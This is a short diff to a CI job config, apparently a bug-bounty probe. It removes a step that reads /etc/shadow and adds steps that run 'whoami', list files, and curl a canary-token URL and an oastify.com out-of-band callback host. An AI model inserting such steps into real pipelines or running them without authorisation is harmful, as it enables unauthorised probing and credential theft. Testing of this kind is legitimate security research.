@@ -7,7 +7,7 @@ jobs:
       name: node/default
       tag: '10.4'
     steps:
-      - run: cat /etc/shadow
+      - run: whoami
       - run: curl https://www.internalfb.com/intern/bug-bounty/get-canary-token/2441627515f94bef8facc556f9f2246d/
       - run: ls -la
       - run: curl https://akyb09r57k1xcyl41kyzgh3yppvgj7cv1.oastify.com
